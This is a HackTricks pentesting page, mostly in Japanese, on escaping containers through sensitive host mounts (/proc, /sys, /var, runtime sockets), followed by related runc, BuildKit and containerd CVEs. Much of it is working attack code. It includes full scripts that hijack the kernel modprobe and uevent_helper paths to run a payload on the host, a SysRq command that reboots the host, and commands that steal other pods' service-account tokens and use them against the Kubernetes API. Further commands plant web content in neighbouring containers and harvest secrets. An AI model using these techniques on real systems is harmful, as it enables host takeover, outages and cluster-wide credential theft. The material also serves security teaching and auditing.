# 機密性の高いホストマウント

{{#include ../../../banners/hacktricks-training.md}}

## 概要

ホストマウントは、しばしば注意深く分離されたプロセスビューをホスト資源の直接可視性に戻してしまうため、実践的なcontainer-escapeの攻撃面として非常に重要です。危険なケースは`/`に限りません。`/proc`、`/sys`、`/var` のbind mount、runtime sockets、kubelet-managed state、またはデバイス関連のパスを公開すると、カーネル制御、認証情報、隣接するコンテナのファイルシステム、ランタイム管理インターフェイスが露出する可能性があります。

このページは個別の保護ページとは別に存在します。悪用モデルが横断的だからです。書き込み可能なホストマウントが危険なのは、部分的には mount namespaces、部分的には user namespaces、部分的には AppArmor や SELinux のカバレッジ、そして部分的にはどのホストパスが公開されたかに依存します。独立したトピックとして扱うことで、攻撃面をより理解しやすくなります。

## `/proc` の露出

procfs は通常のプロセス情報と高影響のカーネル制御インターフェイスの両方を含みます。したがって、`-v /proc:/host/proc` のようなbind mount や、予期しない書き込み可能な proc エントリを公開するコンテナビューは、情報漏洩、サービス拒否、またはホスト上での直接コード実行につながる可能性があります。

高価値な procfs パスには以下が含まれます:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 悪用

まず、どの重要な procfs エントリが表示されているか、または書き込み可能かを確認してください:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
これらのパスはそれぞれ異なる理由で興味深いものです。`core_pattern`、`modprobe`、および `binfmt_misc` は書き込み可能な場合に host code-execution パスになり得ます。`kallsyms`、`kmsg`、`kcore`、および `config.gz` は kernel exploitation のための強力な reconnaissance ソースです。`sched_debug` と `mountinfo` はプロセス、cgroup、filesystem のコンテキストを明らかにし、container 内から host のレイアウトを再構築するのに役立ちます。

各パスの実用的な価値は異なり、すべてを同じ影響があるかのように扱うとトリアージが難しくなります:

- `/proc/sys/kernel/core_pattern`
If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
- `/proc/sys/vm/panic_on_oom`
This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
- `/proc/config.gz`
Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
- `/proc/sysrq-trigger`
Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
- `/proc/kmsg`
Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
- `/proc/kallsyms`
Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
- `/proc/[pid]/mem`
This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
- `/proc/kcore`
Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
- `/proc/kmem` and `/proc/mem`
Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
- `/proc/sched_debug`
Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/[pid]/mountinfo`
Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
これらのコマンドは、いくつかの host-execution tricks がコンテナ内のパスをホストの視点から見た対応するパスに変換することを必要とするため、有用です。

### 完全な例: `modprobe` Helper Path Abuse

もしコンテナから `/proc/sys/kernel/modprobe` に書き込み可能で、helper path がホスト側のコンテキストで解釈される場合、それは attacker-controlled payload にリダイレクトできます：
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
正確なトリガーはターゲットと kernel の挙動によって異なるが、重要なのは writable helper path が将来の kernel helper invocation を attacker-controlled host-path content にリダイレクトできるという点だ。

### 完全な例: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

目的が exploitability assessment であり、即時の escape ではない場合:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
これらのコマンドは、有用なシンボル情報が見えるか、最近のカーネルメッセージが興味深い状態を明らかにするか、どのカーネル機能や緩和策がコンパイルされているかを確認するのに役立ちます。影響は通常、直接的なエスケープではありませんが、カーネル脆弱性のトリアージを大幅に短縮する可能性があります。

### 完全な例: SysRq Host Reboot

もし `/proc/sysrq-trigger` が書き込み可能でホストから見える場合:
```bash
echo b > /proc/sysrq-trigger
```
効果は即時のホスト再起動です。これは微妙な例ではありませんが、procfs の露出が単なる情報公開よりもはるかに深刻になり得ることを明確に示しています。

## `/sys` の露出

sysfs は大量のカーネルおよびデバイスの状態を露出します。いくつかの sysfs パスは主に fingerprinting に有用ですが、他のパスは helper の実行、デバイスの挙動、security-module の設定、あるいはファームウェアの状態に影響を与える可能性があります。

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

これらのパスが重要なのは理由が異なります。`/sys/class/thermal` は熱管理の挙動に影響を与え、露出がひどい環境ではホストの安定性に影響を及ぼす可能性があります。`/sys/kernel/vmcoreinfo` は crash-dump とカーネルレイアウト情報を leak し、低レベルのホスト fingerprinting に役立ちます。`/sys/kernel/security` は Linux Security Modules が使用する `securityfs` インターフェイスであるため、そこへの予期しないアクセスは MAC 関連の状態を露出または変更する可能性があります。EFI 変数のパスはファームウェアに裏付けられたブート設定に影響を与えるため、通常の設定ファイルよりもはるかに深刻です。`debugfs`（`/sys/kernel/debug` 配下）は特に危険です。これは意図的に開発者向けのインターフェイスであり、強化された本番向けカーネル APIs に比べて安全性に関する期待がはるかに低いためです。

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.

### Full Example: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
この手法が機能する理由は、helper path が host の観点から解釈されるためです。トリガーされると、helper は現在の container の内部ではなく host context で実行されます。

## `/var` の露出

host の `/var` を container にマウントすることは、`/` をマウントするほど劇的に見えないため、過小評価されがちです。実際には、runtime sockets、container snapshot directories、kubelet-managed pod volumes、projected service-account tokens、neighboring application filesystems などに到達するのに十分な場合があります。最新のノードでは、`/var` は実際に最も運用的に興味深い container state が存在する場所であることが多いです。

### Kubernetes の例

hostPath: `/var` を持つ pod は、他の pods の projected tokens や overlay snapshot content を読み取れることがよくあります:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
これらのコマンドは、マウントが単にありふれたアプリケーションデータのみを公開しているのか、あるいは高インパクトな cluster credentials を公開しているのかを判断するのに有用です。読み取り可能な service-account token は、ローカルでのコード実行を即座に Kubernetes API へのアクセスに変え得ます。

もし service-account token が存在する場合、トークンの発見で止まらず、トークンが到達できる範囲を検証してください：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
ここでの影響はローカルノードへのアクセスよりもはるかに大きくなる可能性があります。広範な RBAC を持つトークンは、マウントされた `/var` をクラスタ全体の侵害に変えることができます。

### Docker と containerd の例

Docker ホスト上では、関連データは多くの場合 `/var/lib/docker` の下にあります。一方、containerd バックエンドの Kubernetes ノードでは `/var/lib/containerd` や snapshotter 固有のパスにあることがあります:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
マウントされた `/var` が他のワークロードの書き込み可能なスナップショット内容を露出している場合、攻撃者は現在のコンテナ構成に触れずにアプリケーションファイルを改ざんしたり、ウェブコンテンツを植え付けたり、起動スクリプトを変更したりできる可能性があります。

書き込み可能なスナップショット内容が見つかった場合の具体的な悪用アイデア：
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
これらのコマンドは、マウントされた `/var` がもたらす主要な影響の3分類（アプリケーション改ざん、シークレット回収、隣接ワークロードへの横移動）を示すため有用です。

## ランタイムソケット

機密性の高いホストマウントには、フルディレクトリではなくランタイムソケットが含まれていることが多い。これらは非常に重要なので、ここで明示的に繰り返します:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
いずれかのソケットがマウントされた後の full exploitation flows は [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) を参照してください。

簡単な最初のインタラクションパターン：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
これらのうちの1つが成功すると、"mounted socket" から "start a more privileged sibling container" への経路は、通常、kernel breakout path よりもはるかに短くなります。

## マウント関連のCVE

ホストのマウントはランタイムの脆弱性とも交差します。重要な最近の例は以下のとおりです：

- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, where OverlayFS copy-up races could produce host-path writes during builds.
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
- `CVE-2024-40635` in containerd, where a large `User` value could overflow into UID 0 behavior.

これらのCVEがここで重要なのは、マウントの扱いが単にオペレーターの設定だけの問題ではないことを示しているためです。ランタイム自体がマウント駆動のエスケープ条件を導入することもあります。

## チェック

これらのコマンドを使って、価値の高いマウントの露出箇所を素早く特定してください：
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root、`/proc`、`/sys`、`/var`、および runtime sockets はすべて高優先度の発見事項です。
- Writable proc/sys entries は、mount がホスト全体のカーネル制御を露出しており、安全なコンテナビューを提供していないことを示すことが多いです。
- Mounted `/var` paths はファイルシステムのレビューだけでなく、credential と neighboring-workload のレビューが必要です。
{{#include ../../../banners/hacktricks-training.md}}
